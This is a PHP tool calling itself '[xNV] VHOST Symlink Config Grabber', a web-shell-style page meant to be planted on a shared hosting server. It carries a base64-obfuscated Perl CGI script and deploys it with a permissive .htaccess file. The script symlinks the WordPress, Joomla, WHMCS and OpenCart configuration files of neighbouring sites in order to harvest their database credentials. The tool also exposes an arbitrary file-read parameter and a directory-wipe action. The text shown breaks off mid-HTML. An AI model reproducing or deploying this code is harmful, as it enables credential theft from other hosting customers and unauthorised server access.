<?php
error_reporting(E_ALL & ~E_NOTICE & ~E_WARNING);
@ini_set('display_errors', '0');

$default_dir = 'xnvhost';
$default_cgi = 'vhost.xn';
$xnfile = 'IyEvdXNyL2Jpbi9wZXJsCkJFR0lOIHsgJHwgPSAxOyB9CnVzZSBzdHJpY3Q7CnVzZSB3YXJuaW5nczsKCnByaW50ICJDb250ZW50LVR5cGU6IHRleHQvaHRtbFxuXG4iOwpwcmludCAnPCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KPGhlYWQ+CjxtZXRhIGNoYXJzZXQ9InV0Zi04Ij4KPG1ldGEgbmFtZT0idmlld3BvcnQiIGNvbnRlbnQ9IndpZHRoPWRldmljZS13aWR0aCwgaW5pdGlhbC1zY2FsZT0xLjAiPgo8dGl0bGU+W3hOVl0gOjogRW5naW5lIEV4ZWN1dGlvbjwvdGl0bGU+CjxzdHlsZT4KKntib3gtc2l6aW5nOmJvcmRlci1ib3g7bWFyZ2luOjA7cGFkZGluZzowfQpib2R5e2JhY2tncm91bmQ6IzBjMGQxMjtjb2xvcjojZTJlOGYwO2ZvbnQtZmFtaWx5OnVpLW1vbm9zcGFjZSxTRk1vbm8tUmVndWxhciwiSmV0QnJhaW5zIE1vbm8iLENvbnNvbGFzLG1vbm9zcGFjZTtmb250LXNpemU6MTNweDtsaW5lLWhlaWdodDoxLjY7cGFkZGluZzozMHB4IDIwcHh9Ci5je21heC13aWR0aDo4NjBweDttYXJnaW46MCBhdXRvO2JhY2tncm91bmQ6IzEzMTYxZjtib3JkZXI6MXB4IHNvbGlkICMxZTI2Mzg7Ym9yZGVyLXJhZGl1czo4cHg7b3ZlcmZsb3c6aGlkZGVuO2JveC1zaGFkb3c6MCAxMHB4IDMwcHggcmdiYSgwLDAsMCwuNSl9Ci5oe2JhY2tncm91bmQ6IzE4MWQyYTtwYWRkaW5nOjE2cHggMjBweDtib3JkZXItYm90dG9tOjFweCBzb2xpZCAjMWUyNjM4O2Rpc3BsYXk6ZmxleDtqdXN0aWZ5LWNvbnRlbnQ6c3BhY2UtYmV0d2VlbjthbGlnbi1pdGVtczpjZW50ZXJ9Ci5oIGgxe2ZvbnQtc2l6ZToxNXB4O2ZvbnQtd2VpZ2h0OjcwMDtjb2xvcjojMDBmZjg4O2xldHRlci1zcGFjaW5nOi41cHh9Ci5ie3BhZGRpbmc6MnB4IDEwcHg7Ym9yZGVyLXJhZGl1czo0cHg7Zm9udC1zaXplOjExcHg7YmFja2dyb3VuZDojMDBmZjg4MjI7Y29sb3I6IzAwZmY4ODtib3JkZXI6MXB4IHNvbGlkICMwMGZmODg0NH0KLmJke3BhZGRpbmc6MjRweH0KLnNne2Rpc3BsYXk6Z3JpZDtncmlkLXRlbXBsYXRlLWNvbHVtbnM6cmVwZWF0KGF1dG8tZml0LG1pbm1heCgxODBweCwxZnIpKTtnYXA6MTJweDttYXJnaW4tYm90dG9tOjI0cHh9Ci5zYntiYWNrZ3JvdW5kOiMwZTEwMTc7Ym9yZGVyOjFweCBzb2xpZCAjMWUyNjM4O3BhZGRpbmc6MTRweDtib3JkZXItcmFkaXVzOjZweH0KLnNiIC5se2ZvbnQtc2l6ZToxMXB4O2NvbG9yOiM4YjliYjQ7dGV4dC10cmFuc2Zvcm06dXBwZXJjYXNlO2xldHRlci1zcGFjaW5nOi41cHh9Ci5zYiAudntmb250LXNpemU6MjBweDtmb250LXdlaWdodDo3MDA7Y29sb3I6I2ZmZjttYXJnaW4tdG9wOjRweH0KLnRne2JhY2tncm91bmQ6IzBlMTAxNztib3JkZXI6MXB4IHNvbGlkICMxZTI2Mzg7Ym9yZGVyLXJhZGl1czo2cHg7cGFkZGluZzoxNnB4O21hcmdpbi1ib3R0b206MjRweH0KLnRnIGgze2ZvbnQtc2l6ZToxMnB4O2NvbG9yOiMwMGZmODg7bWFyZ2luLWJvdHRvbToxMHB4O3RleHQtdHJhbnNmb3JtOnVwcGVyY2FzZX0KLnR0e2Rpc3BsYXk6ZmxleDtmbGV4LXdyYXA6d3JhcDtnYXA6OHB4fQoudHtiYWNrZ3JvdW5kOiMxYTIyMzM7Ym9yZGVyOjFweCBzb2xpZCAjMjgzNTRkO3BhZGRpbmc6NHB4IDEwcHg7Ym9yZGVyLXJhZGl1czo0cHg7Zm9udC1zaXplOjExcHg7Y29sb3I6I2NiZDVlMX0KLmFje2Rpc3BsYXk6ZmxleDtnYXA6MTJweH0KLmJ0e2Rpc3BsYXk6aW5saW5lLWZsZXg7YWxpZ24taXRlbXM6Y2VudGVyO2dhcDo4cHg7cGFkZGluZzoxMHB4IDE4cHg7YmFja2dyb3VuZDojMDBmZjg4O2NvbG9yOiMwYzBkMTI7Zm9udC13ZWlnaHQ6NzAwO3RleHQtZGVjb3JhdGlvbjpub25lO2JvcmRlci1yYWRpdXM6NnB4O2ZvbnQtc2l6ZToxMnB4O3RyYW5zaXRpb246b3BhY2l0eSAuMnN9Ci5idDpob3ZlcntvcGFjaXR5Oi45fQouYnN7YmFja2dyb3VuZDojMWUyNjM4O2NvbG9yOiNjYmQ1ZTF9Ci5iczpob3ZlcntiYWNrZ3JvdW5kOiMyODM1NGQ7Y29sb3I6I2ZmZn0KPC9zdHlsZT4KPC9oZWFkPgo8Ym9keT4KPGRpdiBjbGFzcz0iYyI+CjxkaXYgY2xhc3M9ImgiPgo8aDE+W3hOVl0gOjogVkhPU1QgU3ltbGluayBFbmdpbmU8L2gxPgo8c3BhbiBjbGFzcz0iYiI+Q09NUExFVEVEPC9zcGFuPgo8L2Rpdj4KPGRpdiBjbGFzcz0iYmQiPgonOwoKbXkgJHZob3N0X3BhdGggPSAnL3Zhci93d3cvdmhvc3RzJzsKbXkgQHRhcmdldHMgPSAoCiAgICBbJy9odHRwZG9jcy93cC1jb25maWcucGhwJywgJ1dvcmRwcmVzcy1yb290J10sCiAgICBbJy9odHRwZG9jcy93cC93cC1jb25maWcucGhwJywgJ1dvcmRwcmVzcy13cCddLAogICAgWycvaHR0cGRvY3MvV1Avd3AtY29uZmlnLnBocCcsICdXb3JkcHJlc3MtV1AnXSwKICAgIFsnL2h0dHBkb2NzL3dwL2JldGEvd3AtY29uZmlnLnBocCcsICdXb3JkcHJlc3Mtd3BiZXRhJ10sCiAgICBbJy9odHRwZG9jcy9iZXRhL3dwLWNvbmZpZy5waHAnLCAnV29yZHByZXNzLWJldGEnXSwKICAgIFsnL2h0dHBkb2NzL3ByZXNzL3dwLWNvbmZpZy5waHAnLCAnV29yZHByZXNzLXByZXNzJ10sCiAgICBbJy9odHRwZG9jcy93b3JkcHJlc3Mvd3AtY29uZmlnLnBocCcsICdXb3JkcHJlc3MtZGlyJ10sCiAgICBbJy9odHRwZG9jcy9Xb3JkcHJlc3Mvd3AtY29uZmlnLnBocCcsICdXb3JkcHJlc3MtRGlyJ10sCiAgICBbJy9odHRwZG9jcy9ibG9nL3dwLWNvbmZpZy5waHAnLCAnV29yZHByZXNzLWJsb2cnXSwKICAgIFsnL2h0dHBkb2NzL3dvcmRwcmVzcy9iZXRhL3dwLWNvbmZpZy5waHAnLCAnV29yZHByZXNzLWRpcmJldGEnXSwKICAgIFsnL2h0dHBkb2NzL25ld3Mvd3AtY29uZmlnLnBocCcsICdXb3JkcHJlc3MtbmV3cyddLAogICAgWycvaHR0cGRvY3MvbmV3L3dwLWNvbmZpZy5waHAnLCAnV29yZHByZXNzLW5ldyddLAogICAgWycvaHR0cGRvY3MvYmxvZ3Mvd3AtY29uZmlnLnBocCcsICdXb3JkcHJlc3MtYmxvZ3MnXSwKICAgIFsnL2h0dHBkb2NzL2hvbWUvd3AtY29uZmlnLnBocCcsICdXb3JkcHJlc3MtaG9tZSddLAogICAgWycvaHR0cGRvY3MvcG9ydGFsL3dwLWNvbmZpZy5waHAnLCAnV29yZHByZXNzLXBvcnRhbCddLAogICAgWycvaHR0cGRvY3MvcHJvdGFsL3dwLWNvbmZpZy5waHAnLCAnV29yZHByZXNzLXByb3RhbCddLAogICAgWycvaHR0cGRvY3Mvc2l0ZS93cC1jb25maWcucGhwJywgJ1dvcmRwcmVzcy1zaXRlJ10sCiAgICBbJy9odHRwZG9jcy9tYWluL3dwLWNvbmZpZy5waHAnLCAnV29yZHByZXNzLW1haW4nXSwKICAgIFsnL2h0dHBkb2NzL3Rlc3Qvd3AtY29uZmlnLnBocCcsICdXb3JkcHJlc3MtdGVzdCddLAoKICAgIFsnL2h0dHBkb2NzL2NvbmZpZ3VyYXRpb24ucGhwJywgJ0pvb21sYS1yb290J10sCiAgICBbJy9odHRwZG9jcy9qb29tbGEvY29uZmlndXJhdGlvbi5waHAnLCAnSm9vbWxhLWRpciddLAogICAgWycvaHR0cGRvY3MvcHJvdGFsL2NvbmZpZ3VyYXRpb24ucGhwJywgJ0pvb21sYS1wcm90YWwnXSwKICAgIFsnL2h0dHBkb2NzL3BvcnRhbC9jb25maWd1cmF0aW9uLnBocCcsICdKb29tbGEtcG9ydGFsJ10sCiAgICBbJy9odHRwZG9jcy9qb28vY29uZmlndXJhdGlvbi5waHAnLCAnSm9vbWxhLWpvbyddLAogICAgWycvaHR0cGRvY3MvY21zL2NvbmZpZ3VyYXRpb24ucGhwJywgJ0pvb21sYS1jbXMnXSwKICAgIFsnL2h0dHBkb2NzL3NpdGUvY29uZmlndXJhdGlvbi5waHAnLCAnSm9vbWxhLXNpdGUnXSwKICAgIFsnL2h0dHBkb2NzL21haW4vY29uZmlndXJhdGlvbi5waHAnLCAnSm9vbWxhLW1haW4nXSwKICAgIFsnL2h0dHBkb2NzL25ld3MvY29uZmlndXJhdGlvbi5waHAnLCAnSm9vbWxhLW5ld3MnXSwKICAgIFsnL2h0dHBkb2NzL25ldy9jb25maWd1cmF0aW9uLnBocCcsICdKb29tbGEtbmV3J10sCiAgICBbJy9odHRwZG9jcy9ob21lL2NvbmZpZ3VyYXRpb24ucGhwJywgJ0pvb21sYS1ob21lJ10sCgogICAgWycvaHR0cGRvY3Mvd2htL2NvbmZpZ3VyYXRpb24ucGhwJywgJ1dITS13aG0nXSwKICAgIFsnL2h0dHBkb2NzL2NlbnRyYWwvY29uZmlndXJhdGlvbi5waHAnLCAnV0hNLWNlbnRyYWwnXSwKICAgIFsnL2h0dHBkb2NzL3dobS93aG1jcy9jb25maWd1cmF0aW9uLnBocCcsICdXSE0td2htLXdobWNzJ10sCiAgICBbJy9odHRwZG9jcy93aG0vV0hNQ1MvY29uZmlndXJhdGlvbi5waHAnLCAnV0hNLXdobS1XSE1DUyddLAogICAgWycvaHR0cGRvY3Mvd2htYy9XSE0vY29uZmlndXJhdGlvbi5waHAnLCAnV0hNLXdobWMtV0hNJ10sCiAgICBbJy9odHRwZG9jcy93aG1jcy9jb25maWd1cmF0aW9uLnBocCcsICdXSE0td2htY3MnXSwKICAgIFsnL2h0dHBkb2NzL3NlY3VyZS93aG0vY29uZmlndXJhdGlvbi5waHAnLCAnV0hNLXNlY3VyZS13aG0nXSwKICAgIFsnL2h0dHBkb2NzL3NlY3VyZS93aG1jcy9jb25maWd1cmF0aW9uLnBocCcsICdXSE0tc2VjdXJlLXdobWNzJ10sCiAgICBbJy9odHRwZG9jcy9zdWJtaXR0aWNrZXQucGhwJywgJ1dITS1zdWJtaXR0aWNrZXQnXSwKICAgIFsnL2h0dHBkb2NzL21hbmFnZS9jb25maWd1cmF0aW9uLnBocCcsICdXSE0tbWFuYWdlJ10sCiAgICBbJy9odHRwZG9jcy9teS9jb25maWd1cmF0aW9uLnBocCcsICdXSE0tbXknXSwKICAgIFsnL2h0dHBkb2NzL215c2hvcC9jb25maWd1cmF0aW9uLnBocCcsICdXSE0tbXlzaG9wJ10sCgogICAgWycvaHR0cGRvY3MvY29uZmlnLnBocCcsICdPcGVuQ2FydC1yb290J10sCiAgICBbJy9odHRwZG9jcy9hZG1pbi9jb25maWcucGhwJywgJ09wZW5DYXJ0LWFkbWluJ10sCiAgICBbJy9odHRwZG9jcy9vcGVuY2FydC9jb25maWcucGhwJywgJ09wZW5DYXJ0LWRpciddLAogICAgWycvaHR0cGRvY3Mvb3BlbmNhcnQvYWRtaW4vY29uZmlnLnBocCcsICdPcGVuQ2FydC1kaXItYWRtaW4nXSwKICAgIFsnL2h0dHBkb2NzL3Nob3AvYWRtaW4vY29uZmlnLnBocCcsICdPcGVuQ2FydC1zaG9wLWFkbWluJ10sCiAgICBbJy9odHRwZG9jcy9zdG9yZS9hZG1pbi9jb25maWcucGhwJywgJ09wZW5DYXJ0LXN0b3JlLWFkbWluJ10sCik7CgpteSAkc2l0ZV9jb3VudCA9IDA7Cm15ICRzeW1saW5rX2NvdW50ID0gMDsKCmlmIChvcGVuZGlyKG15ICRkaXIsICR2aG9zdF9wYXRoKSkgewogICAgbXkgQGVudHJpZXMgPSBncmVwIHsgJF8gIX4gL15cLlwuPyQvIH0gcmVhZGRpcigkZGlyKTsKICAgIGNsb3NlZGlyKCRkaXIpOwogICAgZm9yZWFjaCBteSAkc2l0ZSAoc29ydCBAZW50cmllcykgewogICAgICAgICRzaXRlX2NvdW50Kys7CiAgICAgICAgZm9yZWFjaCBteSAkaXRlbSAoQHRhcmdldHMpIHsKICAgICAgICAgICAgbXkgJHRwID0gJHZob3N0X3BhdGggLiAnLycgLiAkc2l0ZSAuICRpdGVtLT5bMF07CiAgICAgICAgICAgIG15ICRsbiA9ICRzaXRlIC4gJy0nIC4gJGl0ZW0tPlsxXSAuICcudHh0JzsKICAgICAgICAgICAgdW5saW5rKCRsbikgaWYgLWwgJGxuIHx8IC1lICRsbjsKICAgICAgICAgICAgJHN5bWxpbmtfY291bnQrKyBpZiBzeW1saW5rKCR0cCwgJGxuKTsKICAgICAgICB9CiAgICB9Cn0KCnByaW50ICc8ZGl2IGNsYXNzPSJzZyI+CjxkaXYgY2xhc3M9InNiIj48ZGl2IGNsYXNzPSJsIj5UYXJnZXQgQmFzZTwvZGl2PjxkaXYgY2xhc3M9InYiIHN0eWxlPSJmb250LXNpemU6MTRweDtjb2xvcjojMzhiZGY4Ij4nIC4gJHZob3N0X3BhdGggLiAnPC9kaXY+PC9kaXY+CjxkaXYgY2xhc3M9InNiIj48ZGl2IGNsYXNzPSJsIj5TaXRlcyBGb3VuZDwvZGl2PjxkaXYgY2xhc3M9InYiPicgLiAkc2l0ZV9jb3VudCAuICc8L2Rpdj48L2Rpdj4KPGRpdiBjbGFzcz0ic2IiPjxkaXYgY2xhc3M9ImwiPlN5bWxpbmtzIENyZWF0ZWQ8L2Rpdj48ZGl2IGNsYXNzPSJ2IiBzdHlsZT0iY29sb3I6IzAwZmY4OCI+JyAuICRzeW1saW5rX2NvdW50IC4gJzwvZGl2PjwvZGl2Pgo8L2Rpdj4KPGRpdiBjbGFzcz0idGciPjxoMz5BY3RpdmUgTW9kdWxlczwvaDM+PGRpdiBjbGFzcz0idHQiPgo8c3BhbiBjbGFzcz0idCI+V29yZFByZXNzICgxOSk8L3NwYW4+CjxzcGFuIGNsYXNzPSJ0Ij5Kb29tbGEgKDExKTwvc3Bhbj4KPHNwYW4gY2xhc3M9InQiPldITS9XSE1DUyAoMTIpPC9zcGFuPgo8c3BhbiBjbGFzcz0idCI+T3BlbkNhcnQgKDYpPC9zcGFuPgo8L2Rpdj48L2Rpdj4KPGRpdiBjbGFzcz0iYWMiPgo8YSBocmVmPSIuLyIgY2xhc3M9ImJ0Ij4mI3gyMTkwOyBWaWV3IFN5bWxpbmtzPC9hPgo8YSBocmVmPSIuLi92aG9zdC5waHAiIGNsYXNzPSJidCBicyI+JiN4MjY5OTsgQmFjayB0byBbeE5WXTwvYT4KPC9kaXY+CjwvZGl2Pgo8L2Rpdj4KPC9ib2R5Pgo8L2h0bWw+JzsK';


$vhosts_dir = '/var/www/vhosts';
$vhost_candidates = ['/var/www/vhosts','/home','/home2','/home3','/var/www/html','/usr/local/apache/htdocs'];

if (!is_dir($vhosts_dir) || !is_readable($vhosts_dir)) {
    $doc_root = $_SERVER['DOCUMENT_ROOT'] ?? getcwd();
    $check = $doc_root;
    for ($i = 0; $i < 10; $i++) {
        $parent = dirname($check);
        if ($parent === $check) break;
        $base = basename($parent);
        if (in_array($base, ['vhosts','home','home2','home3'])) { $vhosts_dir = $parent; break; }
        $check = $parent;
    }
    if (!is_dir($vhosts_dir) || !is_readable($vhosts_dir)) {
        foreach ($vhost_candidates as $c) {
            if (is_dir($c) && is_readable($c)) { $vhosts_dir = $c; break; }
        }
    }
}

$vhosts_status = is_dir($vhosts_dir) ? (is_readable($vhosts_dir) ? 'Readable' : 'Restricted') : 'Not Found';
$server_os = PHP_OS . ' (' . php_uname('m') . ')';
$web_server = $_SERVER['SERVER_SOFTWARE'] ?? 'Unknown';
$php_ver = PHP_VERSION;
$open_basedir = ini_get('open_basedir') ?: 'Off';

$action_msg = '';
$action_status = '';

function rrmdir($dir) {
    if (!is_dir($dir)) return false;
    $items = @scandir($dir);
    if (!$items) return false;
    foreach ($items as $item) {
        if ($item === '.' || $item === '..') continue;
        $path = $dir . '/' . $item;
        is_dir($path) && !is_link($path) ? rrmdir($path) : @unlink($path);
    }
    return @rmdir($dir);
}

if (isset($_POST['action']) && $_POST['action'] === 'clean') {
    $target_dir = preg_replace('/[^a-zA-Z0-9_\.\-]/', '', $_POST['clean_dir'] ?? $default_dir);
    if ($target_dir && is_dir($target_dir)) {
        if (rrmdir($target_dir)) {
            $action_status = 'success';
            $action_msg = "Directory '{$target_dir}' wiped.";
        } else {
            $action_status = 'error';
            $action_msg = "Failed to remove '{$target_dir}'.";
        }
    } else {
        $action_status = 'error';
        $action_msg = "Directory '{$target_dir}' not found.";
    }
}

if (isset($_POST['action']) && $_POST['action'] === 'deploy') {
    $out_dir = preg_replace('/[^a-zA-Z0-9_\.\-]/', '', $_POST['out_dir'] ?: $default_dir);
    $cgi_file = preg_replace('/[^a-zA-Z0-9_\.\-]/', '', $_POST['cgi_file'] ?: $default_cgi);
    $ext = pathinfo($cgi_file, PATHINFO_EXTENSION);
    if (!$ext) { $ext = 'xn'; $cgi_file .= '.xn'; }
    if (!is_dir($out_dir)) @mkdir($out_dir, 0755, true);
    if (is_dir($out_dir) && is_writable($out_dir)) {
        $ht = "Options FollowSymLinks MultiViews Indexes ExecCGI\nAddType application/x-httpd-cgi .{$ext}\nAddHandler cgi-script .{$ext}\n";
        $ht_ok = @file_put_contents($out_dir . '/.htaccess', $ht);
        $cgi_path = $out_dir . '/' . $cgi_file;
        $cgi_ok = @file_put_contents($cgi_path, base64_decode($xnfile));
        @chmod($cgi_path, 0755);
        if ($ht_ok && $cgi_ok) {
            $action_status = 'success';
            $action_msg = "Deployed to '{$out_dir}/{$cgi_file}'.";
            $deployed_dir = $out_dir;
            $deployed_cgi = $cgi_file;
        } else {
            $action_status = 'error';
            $action_msg = "Write failed in '{$out_dir}'.";
        }
    } else {
        $action_status = 'error';
        $action_msg = "Cannot write to '{$out_dir}'.";
    }
}

$view_content = '';
$view_filename = '';
if (isset($_GET['read'])) {
    $rf = $_GET['read'];
    if (strpos($rf, '..') === false && is_file($rf) && is_readable($rf)) {
        $view_filename = basename($rf);
        $view_content = @file_get_contents($rf);
    }
}

$active_dir = '';
foreach ([$default_dir, 'xnfile'] as $cd) {
    if (is_dir($cd)) { $active_dir = $cd; break; }
}
if (isset($_POST['out_dir']) && is_dir($_POST['out_dir'])) {
    $active_dir = preg_replace('/[^a-zA-Z0-9_\.\-]/', '', $_POST['out_dir']);
}

$symlink_list = [];
if ($active_dir && is_dir($active_dir) && is_readable($active_dir)) {
    $scanned = @scandir($active_dir);
    if ($scanned) {
        foreach ($scanned as $item) {
            if ($item === '.' || $item === '..' || $item === '.htaccess') continue;
            $iext = pathinfo($item, PATHINFO_EXTENSION);
            if (in_array($iext, ['xn','cin','cgi','pl'])) continue;
            $ip = $active_dir . '/' . $item;
            $il = is_link($ip);
            $sz = @filesize($ip);
            $symlink_list[] = [
                'name' => $item, 'path' => $ip, 'is_link' => $il,
                'target' => $il ? @readlink($ip) : 'File',
                'size' => ($sz !== false && $sz > 0) ? $sz : 0
            ];
        }
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>[xNV] :: VHOST Symlink Engine</title>
<style>
:root{--bp:#0a0c10;--bc:#11141d;--bs:#0d0f17;--bh:#161a26;--bo:#1e2433;--bf:#10b981;--tp:#e2e8f0;--ts:#94a3b8;--tm:#64748b;--ag:#10b981;--ac:#06b6d4;--ar:#f43f5e;--aa:#f59e0b;--fm:ui-monospace,SFMono-Regular,"JetBrains Mono",Menlo,Consolas,monospace;--fs:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif}
*{box-sizing:border-box;margin:0;padding:0}
body{background:var(--bp);color:var(--tp);font-family:var(--fs);font-size:13px;line-height:1.6;padding:24px 16px;min-height:100vh}
.w{max-width:1080px;margin:0 auto;display:flex;flex-direction:column;gap:20px}
.tn{display:flex;justify-content:space-between;align-items:center;background:var(--bc);border:1px solid var(--bo);padding:16px 22px;border-radius:8px}
.br{display:flex;align-items:center;gap:12px}
.bi{width:32px;height:32px;background:rgba(16,185,129,.12);border:1px solid rgba(16,185,129,.3);border-radius:6px;display:flex;align-items:center;justify-content:center;color:var(--ag)}
.bn{font-family:var(--fm);font-size:17px;font-weight:700;color:#fff;letter-spacing:.5px}
.bn span{color:var(--ag)}
.bd{font-size:11px;color:var(--tm);font-family:var(--fm)}
.sp{display:inline-flex;align-items:center;gap:6px;padding:4px 12px;border-radius:20px;font-size:11px;font-family:var(--fm);background:rgba(16,185,129,.1);border:1px solid rgba(16,185,129,.25);color:var(--ag)}
.sd{width:7px;height:7px;border-radius:50%;background:var(--ag);box-shadow:0 0 8px var(--ag)}
.dg{display:grid;grid-template-columns:repeat(auto-fit,minmax(240px,1fr));gap:12px}
.di{background:var(--bc);border:1px solid var(--bo);padding:12px 16px;border-radius:6px}
.dl{font-size:11px;text-transform:uppercase;color:var(--tm);font-family:var(--fm);margin-bottom:4px}
.dv{font-family:var(--fm);font-size:12px;color:var(--tp);overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
.dv.g{color:var(--ag)}.dv.wr{color:var(--aa)}.dv.d{color:var(--ar)}
.cd{background:var(--bc);border:1px solid var(--bo);border-radius:8px;overflow:hidden}
.ch{background:var(--bh);padding:14px 20px;border-bottom:1px solid var(--bo);display:flex;justify-content:space-between;align-items:center}
.ct{font-family:var(--fm);font-size:13px;font-weight:700;color:#fff;display:flex;align-items:center;gap:8px}
.cb{padding:20px}
.al{padding:12px 16px;border-radius:6px;font-family:var(--fm);font-size:12px;margin-bottom:20px;display:flex;align-items:center;gap:10px}
.al-s{background:rgba(16,185,129,.12);border:1px solid rgba(16,185,129,.3);color:#34d399}
.al-e{background:rgba(244,63,94,.12);border:1px solid rgba(244,63,94,.3);color:#fb7185}
.fg{display:grid;grid-template-columns:repeat(auto-fit,minmax(280px,1fr));gap:18px;margin-bottom:20px}
.fi{display:flex;flex-direction:column;gap:6px}
.fl{font-family:var(--fm);font-size:11px;color:var(--ts);text-transform:uppercase}
.fx{background:var(--bs);border:1px solid var(--bo);color:var(--tp);font-family:var(--fm);font-size:12px;padding:9px 12px;border-radius:5px;transition:border-color .2s}
.fx:focus{outline:none;border-color:var(--bf)}
.fh{font-size:11px;color:var(--tm)}
.mb{background:var(--bs);border:1px solid var(--bo);padding:14px 16px;border-radius:6px;margin-bottom:20px}
.mt{font-size:11px;font-family:var(--fm);text-transform:uppercase;color:var(--ts);margin-bottom:10px}
.bl{display:flex;flex-wrap:wrap;gap:8px}
.tb{display:inline-flex;align-items:center;gap:6px;background:#19202f;border:1px solid #28344c;padding:5px 12px;border-radius:4px;font-size:11px;font-family:var(--fm);color:var(--tp)}
.tb span{color:var(--ag);font-weight:700}
.bg{display:flex;flex-wrap:wrap;gap:10px}
.btn{display:inline-flex;align-items:center;gap:8px;padding:10px 18px;border-radius:5px;font-family:var(--fm);font-size:12px;font-weight:600;cursor:pointer;text-decoration:none;border:none;transition:all .2s}
.bp{background:var(--ag);color:#051b11}.bp:hover{background:#0ea372;color:#000}
.bsc{background:#1e2638;color:#cbd5e1;border:1px solid #2a354c}.bsc:hover{background:#273248;color:#fff}
.bdn{background:rgba(244,63,94,.15);color:#fb7185;border:1px solid rgba(244,63,94,.3)}.bdn:hover{background:var(--ar);color:#fff}
.ds{background:rgba(16,185,129,.05);border:1px solid rgba(16,185,129,.2);border-radius:6px;padding:16px;margin-bottom:20px}
.ds h4{font-family:var(--fm);font-size:12px;color:var(--ag);margin-bottom:12px;text-transform:uppercase}
.sl{display:flex;flex-wrap:wrap;gap:12px}
.tw{overflow-x:auto;margin-top:10px;border:1px solid var(--bo);border-radius:6px}
table{width:100%;border-collapse:collapse;font-family:var(--fm);font-size:12px;text-align:left}
th{background:var(--bh);color:var(--ts);padding:10px 14px;border-bottom:1px solid var(--bo);font-weight:600;text-transform:uppercase;font-size:11px}
td{padding:9px 14px;border-bottom:1px solid var(--bo);color:var(--tp)}
tr:last-child td{border-bottom:none}tr:hover td{background:rgba(255,255,255,.02)}
.lk{color:var(--ac);text-decoration:none}.lk:hover{text-decoration:underline}
.vb{background:var(--bs);border:1px solid var(--bo);border-radius:6px;margin-top:20px;overflow:hidden}
.vh{background:var(--bh);padding:10px 16px;display:flex;justify-content:space-between;align-items:center;border-bottom:1px solid var(--bo);font-family:var(--fm);font-size:12px;color:var(--ac)}
.vc{padding:16px;max-height:400px;overflow-y:auto;font-family:var(--fm);font-size:12px;white-space:pre-wrap;word-break:break-all;color:#e2e8f0}
.ft{text-align:center;font-family:var(--fm);font-size:11px;color:var(--tm);padding:10px 0}
</style>
</head>
<body>
<div class="w">

<header class="tn">
<div class="br">
<div class="bi"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="4 17 10 11 4 5"></polyline><line x1="12" y1="19" x2="20" y2="19"></line></svg></div>
<div>
<div class="bn">[<span>xNV</span>] <small style="font-size:11px;color:#64748b">v1.0</small></div>
<div class="bd">VHOST Symlink Config Grabber</div>
</div>
</div>
<div class="sp"><div class="sd"></div><span>READY</span></div>
</header>

<div class="dg">
<div class="di"><div class="dl">Server OS</div><div class="dv"><?php echo htmlspecialchars($server_os); ?></div></div>
<div class="di"><div class="dl">Web Server</div><div class="dv"><?php echo htmlspecialchars($web_server); ?></div></div>
<div class="di"><div class="dl">PHP / open_basedir</div><div class="dv <?php echo $open_basedir === 'Off' ? 'g' : 'wr'; ?>">PHP <?php echo $php_ver; ?> | <?php echo htmlspecialchars($open_basedir); ?></div></div>
<div class="di"><div class="dl">VHOST Path</div><div class="dv <?php echo $vhosts_status === 'Readable' ? 'g' : ($vhosts_status === 'Restricted' ? 'wr' : 'd'); ?>"><?php echo htmlspecialchars($vhosts_dir); ?> (<?php echo $vhosts_status; ?>)</div></div>
</div>

<?php if ($action_msg): ?>
<div class="al al-<?php echo $action_status === 'success' ? 's' : 'e'; ?>">
<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
<?php if ($action_status === 'success'): ?><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"></path><polyline points="22 4 12 14.01 9 11.01"></polyline>
<?php else: ?><circle cx="12" cy="12" r="10"></circle><line x1="12" y1="8" x2="12" y2="12"></line><line x1="12" y1="16" x2="12.01" y2="16"></line>
<?php endif; ?></svg>
<span><?php echo htmlspecialchars($action_msg); ?></span>
</div>
<?php endif; ?>

<div class="cd">
<div class="ch">
<div class="ct"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="2" width="20" height="8" rx="2" ry="2"></rect><rect x="2" y="14" width="20" height="8" rx="2" ry="2"></rect><line x1="6" y1="6" x2="6.01" y2="6"></line><line x1="6" y1="18" x2="6.01" y2="18"></line></svg> Deploy Engine</div>
<span style="font-family:var(--fm);font-size:11px;color:var(--tm)">CGI &amp; .htaccess</span>
</div>
<div class="cb">
<form method="post">
<input type="hidden" name="action" value="deploy">
<div class="fg">
<div class="fi">
<label class="fl">Output Directory</label>
<input type="text" name="out_dir" class="fx" value="<?php echo htmlspecialchars($active_dir ?: $default_dir); ?>" required>
<span class="fh">Folder for .htaccess + CGI</span>
</div>
<div class="fi">
<label class="fl">CGI Filename</label>
<input type="text" name="cgi_file" class="fx" value="<?php echo htmlspecialchars($default_cgi); ?>" required>
<span class="fh">Name &amp; extension (auto-mapped)</span>
</div>
</div>
<div class="mb">
<div class="mt">Target Modules</div>
<div class="bl">
<div class="tb">WordPress: <span>19</span></div>
<div class="tb">Joomla: <span>11</span></div>
<div class="tb">WHM/WHMCS: <span>12</span></div>
<div class="tb">OpenCart: <span>6</span></div>
</div>
</div>
<div class="bg">
<button type="submit" class="btn bp"><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polygon points="5 3 19 12 5 21 5 3"></polygon></svg> Deploy [xNV] Engine</button>
<?php if ($active_dir && is_dir($active_dir)): ?>
<a href="<?php echo htmlspecialchars($active_dir); ?>/" target="_blank" class="btn bsc"><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6"></path><polyline points="15 3 21 3 21 9"></polyline><line x1="10" y1="14" x2="21" y2="3"></line></svg> Browse Index</a>
